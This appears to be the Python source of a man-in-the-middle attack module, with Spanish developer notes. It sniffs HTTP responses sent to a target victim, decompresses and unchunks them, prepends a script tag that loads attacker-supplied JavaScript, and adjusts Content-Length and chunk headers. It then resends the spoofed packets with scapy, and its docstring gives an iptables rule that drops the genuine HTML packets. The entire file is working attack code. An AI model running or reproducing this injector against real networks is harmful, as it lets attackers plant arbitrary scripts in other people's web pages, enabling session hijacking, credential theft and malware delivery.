#Nuevo acercamiento al problema: inyectar en html

#Parece que cuando la longitud de la load es superior a 1434, la longitud del paquete supera los 1514,
#que parece ser el limite de lo que recibe el ordenador victima. ver por que aumenta el tamaño del paquete
#(posiblemente trailer) y probar en otro pc a ver si el tamaño es diferente

#en mi maquina atacante segun wireshark la longitud del paquete que envio es de 1530, y la original 1516.
#justamente es 14 la longitud del trailer. no parece que sea scapy el que este añadiendo el padding de dos octetos,
#ya que las dos situaciones en las que lo hacen tienen colocadas un print que no salta en ningun momento.

#sin embargo scapy me dice que mi paquete mide 1500 mientras que el paquete real mide 1514.
#es posible que estos 14 sean por la capa Ether, ya que mi paquete con capa Ether tambien mide 1514.

#UPDATE: todo era problema del kernel de ubuntu version 4.15


#No puedo inyectar cuando:
# - Me llega un paquete solo con los http headers, sin body, ya que si esta gzip no puedo meter nada. Si solo esta
#   chunked igual si.
# - Me llega un paquete gzipped incompleto, ya que no puedo descomprimir. --> espero a mas paquetes?
# - Me llega un paquete con mas de un chunk, ya que no esta implementado. --> implementarlo?

#Puedo inyectar cuando:
# - Me llega un paquete chunked, sin gzip, incompleto o completo.
# - Me llega un paquete chunked o no chunked, con gzip completo.
# - Me llega un paquete no chunked, sin gzip, completo o incompleto.


import threading
import gzip
from scapy.all import *

from src import packet_utilities
from src.log import log

class ForwardPacketPlease(Exception):
    """Exception raised when a known error occurs and it is not possible to
    inject code in the packet. In those cases, the original packet must be
    forwarded.
    """
    pass
    

class Spoofed_HTTP_Load(bytes):
    """Bytes class that creates a spoofed http load, adding code to the
    original one, changing length header, etc. When you create it, it performs 
    all needed procedures in order to return a correct spoofed load with the 
    injected code.
    """
    
    def _gzip_action_if_needed(self, load, action):
        """Compress or decompresses the load if gzip encoding was detected.
        
        Parameters:
            load (bytes): the http load that will be compressed or 
                decompressed. It must not include http headers.
            action (str): the performed action, which can be 'compress' or 
                'decompress'.
                
        Returns:
            bytes: the load, whether the action has been applied or not.
        """
        
        if action == "compress": action_f = gzip.compress
        elif action == "decompress": action_f = gzip.decompress
        
        if "gzip" in self.content_encoding_header:
            load = action_f(load)
        return load
        
        
    def _update_and_add_chunk_length_if_needed(self, load, b_old_chunk_length, length_difference):
        """Adds the chunk length header to the beggining of a http load.
        
        It is added according to the old chunk length and the length difference
        between the old and the new load. This is done only if chunk encoding 
        is detected.
        
        Parameters:
            load (bytes): the load the chunk length will be added to. It must 
                not include http headers.
            b_old_chunk_length (bytes): the complete chunk length header of the
                old load, which is the chunk length in hexadecimal followed by 
                \\r\\n. 
            length_difference (int): the difference between the length of the 
                old load and the length of the new load.
                
        Returns:
            bytes: the load with the chunk length header. If there is not chunk
                encoding, it will remain the same.
        """
        
        if b_old_chunk_length and "chunked" in self.transfer_encoding_header:
            int_old_chunk_length = int(b_old_chunk_length[:-2].decode("utf-8", "ignore"), 16) #paso de bytes de base 16 a int de base 10
            new_int_chunk_length = int_old_chunk_length + length_difference #le sumo la diferencia
            new_b_chunk_length = hex(new_int_chunk_length)[2:].encode("utf-8", "ignore") + b"\r\n" #paso la longitud de int de base 10 a bytes de base 16. lo del 2 es para quitar el '0x'
            load = new_b_chunk_length + load
            #print(len(self.injected_code), b_old_chunk_length, new_b_chunk_length)
        return load
    
    
    def _remove_header_attribute_if_needed(self, header_name, load, length_needed):
        """Removes a given http header from a http load to reduce its length. 
        
        It can be removed totally or partially according to the needed length 
        of the final load. 
        
        Parameters:
            header_name (bytes or str): the key name of the http header. For 
                example: 'Expires', 'Date'
            load (bytes): the load whose header will be removed. It must
                include http headers, so it is the full http packet.
            length_needed (int): the final length of the load. It is usually 
                the length of the original load. so both have the same length.
        
        Returns:
            bytes: the load, whether the header has been removed or not.
        """
        
        if len(load) > length_needed:
            new_load = load
            attr_all = packet_utilities.get_header_attribute_from_http_load(header_name, new_load)
            if not attr_all: #the attribute is not in the load
                return load
            
            if len(load) - len(attr_all) > length_needed: #si a pesar de quitarle el atributo sigue siendo muy largo, se lo quito entero
                new_load = new_load.replace(attr_all, b"", 1)
            else: #quito la longitud adecuada para llegar al tamaño
                remove = attr_all[-2-(len(load)-length_needed):-2] #la parte del atributo que quito
                
                #si la longitud de lo que vamos a quitar es mayor a la longitud de lo que seria
                #el valor del atributo, en vez de dejar el nombre del atributo a medias (ej 'Expir'),
                #mejor dejar el valor del atributo vacio pero con el nombre (ej 'Expires: \r\n')
                #attrl_all:     Expires: ejemplo\r\n    18   
                #header_name:   Expires                 7   
                #remove:        res: ejemplo        12
                #final:         Expi\r\n                6
                #should be:     Expires: \r\n           11
                
                if len(remove) >= len(attr_all) - len(header_name+": \n\r"): 
                    remove = attr_all[len(header_name + ": \n\r")-2:-2]

                new_load = new_load.replace(remove, b"", 1)
            return new_load
        else:
            return load


    def _shorten_load_if_needed(self, load, length_needed):
        """Shortens a http load to the needed length, removing unnecessary http
        headers.
        
        Parameters:
            load (bytes): the load that will be shortened. It must include http
                headers, so it is the full http packet.
            length_needed (int): the final length of the load. It is usually 
                the length of the original load. so both have the same length.
                
        Returns:
            bytes: the shortened load.
        """
        
        attributes = ["Date", "Expires", "Last-Modified", "Server", "X-Powered-By", "X-Served-By", "X-Cache", "X-Cache-Hits", "X-Timer"] #not sure about those last X-*
        
        new_load = load
        for attr in attributes:
            new_load = self._remove_header_attribute_if_needed(self, attr, new_load, length_needed)
        
        if len(new_load) > length_needed:
            #This doesnt seem a problem.
            log.js.warning("exceeded_len", len_load=len(load), len_new_load = len(new_load), len_needed = length_needed, len_difference = str(len(new_load)-length_needed))
        return new_load
                
    
    def _update_length_header_if_needed(self, old_load, new_load):
        """Updates the length header at the beggining of a http packet.
        
        It is updated according to the difference with the length of the old 
        load, and just if it is found.
        
        Parameters:
            old_load (bytes): the original load received. It must include http
                headers, so it is the full http packet.
            new_load (bytes): the load whose length header will be changed. It
                must include http headers, so it is the full http packet.
                
        Returns:
            bytes: the updated load.
        """
        
        length_all = packet_utilities.get_header_attribute_from_http_load("Content-Length", new_load)
        if length_all:
            length_n = length_all[16:-2]
            new_length = b"Content-Length: " + str(int(length_n)+(len(new_load) - len(old_load))).encode("utf-8") + b"\r\n"
            new_load = new_load.replace(length_all, new_length, 1)
        return new_load
        
        
    def _remove_chunk_length_if_needed(self, load):
        """Removes the FIRST chunk length header from a http load if chunk 
        encoding was detected.
        
        Parameters:
            load (bytes): the http load that will be unchunked. It must not 
                include http headers.
        
        Returns:
            tuple: which contains
                bytes: the removed chunk length header,  If there is no chunk 
                    encoding, empty bytes will be returned.
                bytes: the unchunked load. If there is no chunk encoding, the 
                    load will remain the same.
        """
        
        if "chunked" in self.transfer_encoding_header:
            pos = load.find(b"\r\n")
            chunk_len = load[:pos+2]
            new_load = load.replace(chunk_len, b"")
            return chunk_len, new_load
        return b"", load
    
    
    def __new__(self, real_load, injected_code):
        """Creates a new spoofed http load with the injected code at the
        beggining. 
        
        The procedure usually is: unchunking if needed, decompressing if 
        needed, adding code, compressing if needed, chunking if needed,
        shortening and updating.
        
        Parameters:
            real_load (bytes): the original load the code will be injected to.
            injected_code (bytes): the code that will be injected.
        
        Possible Exceptions: 
            ForwardPacketPlease: raised when a known error occurs, for example 
                when attempts to spoof an incomplete or empty gzipped load.
            Other Exceptions: 
                raised when an unknown error or an error whose handling has not
                yet been implemented.
        
        Returns:
            bytes: the spoofed load.
        """

        spoof_load = real_load
        
        self.injected_code = injected_code
        
        self.content_encoding_header = packet_utilities.get_header_attribute_from_http_load("Content-Encoding", spoof_load).decode("utf-8", "ignore")
        self.transfer_encoding_header = packet_utilities.get_header_attribute_from_http_load("Transfer-Encoding", spoof_load).decode("utf-8", "ignore")
            
        spoof_load = spoof_load.split(b"\r\n\r\n")
        
        if spoof_load[1]: #normal procedure: packet contains data appart from headers
            old_chunk_length, spoof_load[1] = self._remove_chunk_length_if_needed(self, spoof_load[1])
            length_before_adding_code = len(spoof_load[1])
            try:
                spoof_load[1] = self._gzip_action_if_needed(self, spoof_load[1], "decompress")
                #print("gzip decompression worked")
            except EOFError as err:
                if err.args[0] == "Compressed file ended before the end-of-stream marker was reached":
                    raise ForwardPacketPlease("Compressed file ended before the end-of-stream marker was reached")
                else:
                    raise
            except Exception as err:
                #In this cases, the packet is not spoofed and the real packet is forwarded.
                raise
                    
            spoof_load[1] = self.injected_code + spoof_load[1]
            spoof_load[1] = self._gzip_action_if_needed(self, spoof_load[1], "compress") 
            
            length_after_adding_code = len(spoof_load[1])
            spoof_load[1] = self._update_and_add_chunk_length_if_needed(self, spoof_load[1], old_chunk_length, length_after_adding_code - length_before_adding_code)
        
        else: #unusual procedure: packet contains only headers
            if not "gzip" in self.content_encoding_header: #this hasn't happened yet
                spoof_load[1] = self.injected_code
                if "chunked" in self.transfer_encoding_header:
                    spoof_load[1] = self._update_and_add_chunk_length_if_needed(self, spoof_load[1], b"0\r\n", len(self.injected_code))
                print(spoof_load[0].decode(), spoof_load[1].decode("utf-8", "ignore"))
                print("chunked without gzip in empty packet")
            else:
                raise ForwardPacketPlease("Empty gzipped packet")
        
        spoof_load = b"\r\n\r\n".join(spoof_load)
        
        spoof_load = self._shorten_load_if_needed(self, spoof_load, len(real_load))
        spoof_load = self._update_length_header_if_needed(self, real_load, spoof_load)
        
        #print(real_load)
        #print(spoof_load)
        return super().__new__(self, spoof_load)


class JS_Injecter(threading.Thread):
    """Thread of the JS Injecting module.
    
    It intercepts every first http answer from the server to the victim,
    injects code in it and sends it.
    
    Iptables rule needed:
        iptables -A FORWARD -p tcp --sport 80 -m string --string 'ype: 
            text/html' --algo bm -j DROP
    """
    
    def __init__(self, exit_event, target, file_loc, timeout):
        """Created the thread.
        
        Parameters:
            exit_event (threading.Event): the event that will be checked to
                finish the thread and so the DNS Spoofing attack.
            target (str): the IP address of the target. ARP packets will be
                sent to this IP. Optional 'everyone' string can be passed, and
                every device in the net will be targetted.
            file_loc (str): the location of the file which contains the code
                that will be injected.
            timeout (int, None): the time in seconds of the duration of the
                attack. If None, it will last until CTRL-C is pressed.
            As a Thread, it can also have any of a thread parameters. See
            help(threading.Thread) for more help.
        """
        
        super().__init__()
        self.exit_event = exit_event
        self.target = target
        self.timeout = timeout
        self.injected_code = b"<script src=\"" + file_loc.encode("utf-8") + b"\"></script>\n"

        self.handled_packets = []
          
    
    def _add_handled_packet(self, packet):
        """Adds a packet to the list of handled packets.
        
        It adds a tuple which contains the packet ack number, the packet seq 
        number and the packet TCP checksum.
        
        Parameters:
            packet (scapy.packet.Packet): handled packet
        """
        
        data = (packet["TCP"].ack, packet["TCP"].seq, packet_utilities.get_checksum(packet, "TCP"))
        if not data in self.handled_packets: #why the hell did i put this
            self.handled_packets.append(data) 
            
    
    def _has_packet_been_handled(self, packet):
        """Checks if a packet has been handled, depending on its ack number,
        seq number and its TCP checksum.
        
        Parameters:
            packet (scapy.packet.Packet): the packet that may has been handled.
            
        Returns:
            bool: True if it has already been handled, False otherwise. 
        """
        
        result = ((packet["TCP"].ack, packet["TCP"].seq, packet_utilities.get_checksum(packet, "TCP")) in self.handled_packets)
        return result
        
        
    def _send_spoofed_packet(self, real_packet):
        """Creates a spoofed http packet with injected code and sends it.
        
        Parameters:
            real_packet (scapy.packet.Packet): original packet.
        """
        
        try:
            spoof_load = Spoofed_HTTP_Load(real_packet.load, self.injected_code)
        except ForwardPacketPlease as err:
            if err.args[0] == "Empty gzipped packet":
                log.js.warning("gzipped_empty_packet")
            elif err.args[0] == "Compressed file ended before the end-of-stream marker was reached":
                log.js.warning("gzipped_uncomplete_packet")
                
            self._forward_http_packet(real_packet)
            return
        except Exception as err:
            log.error("js", "Unexpected error creating spoofed http load:", type(err), err, ". Original packet length:", len(real_packet))
            self._forward_http_packet(real_packet)
            #raise
            return

        spoof_packet = IP(src=real_packet["IP"].src, dst=real_packet["IP"].dst, flags=real_packet["IP"].flags)/ \
                       TCP(sport=real_packet["TCP"].sport, dport=real_packet["TCP"].dport, seq=real_packet["TCP"].seq, ack=real_packet["TCP"].ack, flags=real_packet["TCP"].flags)/ \
                       Raw(load=spoof_load)
        
        send(spoof_packet, verbose=0)
        self._add_handled_packet(spoof_packet)
        log.js.info("packet_handled", len_spoof_load = len(spoof_load), len_real_load = len(real_packet.load))
        
    
    def _forward_http_packet(self, packet):
        """Creates a http packet according to the original packet and sends it.
        
        Parameters:
            packet (scapy.packet.Packet): the packet that will be forwarded.
        """

        p = IP(dst=packet["IP"].dst, src=packet["IP"].src)/ \
            TCP(dport=packet["TCP"].dport, sport=packet["TCP"].sport, ack=packet["TCP"].ack, seq=packet["TCP"].seq, flags=packet["TCP"].flags)/ \
            Raw(load=packet.load)

        send(p, verbose=0)
        
        
    def _handle_packet(self, packet):
        """Handles a http packet.
        
        Parameters:
            packet (scapy.packet.Packet): the packet that will be handled.
        """
        
        if not self._has_packet_been_handled(packet):
            self._add_handled_packet(packet)
            self._send_spoofed_packet(packet)
                
        
    def run(self):
        """Method representing the thread's activity. It is started when start
        function is called.
        
        It intercepts every first http answer packet from the server to the
        victim and handles it, injecting code when it's possible.
        """
        
        log.js.info("start", timeout=self.timeout, target=self.target)
        
        #T not included in lfilter cause its sometimes t and sometimes T
        sniff(filter="tcp and src port 80 and host " + self.target, lfilter= lambda x: x.haslayer("TCP") and x.haslayer("Raw") and b"ype: text/html" in x.load, 
              prn=self._handle_packet, stopperTimeout=3, stopper=self.exit_event.is_set, 
              timeout=self.timeout, store=False)
        
        log.js.info("finish")
